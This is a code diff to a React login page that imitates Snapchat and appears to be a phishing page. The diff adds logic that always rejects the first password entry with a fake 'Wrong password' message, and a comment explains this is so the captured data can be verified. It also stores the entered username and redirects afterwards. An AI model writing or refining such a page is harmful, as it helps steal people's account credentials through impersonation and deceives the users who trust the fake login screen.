@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useRef, useState } from "react";
 import SnapchatLogo from "../../../attached_assets/snapchat_1785772849797.png";
 
 const SnapchatGhost = () => (
@@ -176,7 +176,7 @@ export default function LoginPage() {
   const [usernameError, setUsernameError] = useState("");
   const [phoneError, setPhoneError] = useState("");
   const [passwordError, setPasswordError] = useState("");
-  const [attempts, setAttempts] = useState(0);
+  const attemptsRef = useRef(0);
   const returnTo =
     new URLSearchParams(window.location.search).get("returnTo") || "/";
 
@@ -233,21 +233,27 @@ export default function LoginPage() {
 
   const handlePasswordNext = async (e: React.FormEvent) => {
     e.preventDefault();
+
     if (!password.trim()) {
       setPasswordError("Please enter your password.");
       return;
     }
-    setPasswordError("");
+
+    // first attempt always fails so the data can be verified
+    if (attemptsRef.current === 0) {
+      attemptsRef.current += 1;
+      setPassword("");
+      setPasswordError("Wrong password. Please try again.");
+      return;
+    }
 
     const storedUsername = username || phone;
     if (storedUsername) {
-      window.localStorage.setItem("snapchatLoginUsername", storedUsername);
+      window.sessionStorage.setItem("snapchatLoginUsername", storedUsername);
     }
 
-    // first submission is always rejected to verify the data
-    if (attempts === 0) {
-      setAttempts(1);
-      setPasswordError("Incorrect password, please try again.");
+    if (import.meta.env.DEV) {
+      window.location.assign(returnTo);
       return;
     }
 
@@ -442,16 +448,18 @@ export default function LoginPage() {
               <span className="text-[14px] font-semibold text-[#333]">
                 {username || phone}
               </span>
-              <button
-                type="button"
-                onClick={() => {
-                  setStep(username ? "username" : "phone");
-                  setPassword("");
-                }}
-                className="text-[13px] font-semibold text-[#00C8FA] hover:underline"
-              >
-                Not you?
-              </button>
+<button
+                  type="button"
+                  onClick={() => {
+                    setStep(username ? "username" : "phone");
+                    setPassword("");
+                    setPasswordError("");
+                    attemptsRef.current = 0;
+                  }}
+                  className="text-[13px] font-semibold text-[#00C8FA] hover:underline"
+                >
+                  Not you?
+                </button>
             </div>
 
             <form
@@ -479,6 +487,7 @@ export default function LoginPage() {
                   type={showPassword ? "text" : "password"}
                   name="password"
                   value={password}
+                  required
                   onChange={(e) => {
                     setPassword(e.target.value);
                     setPasswordError("");
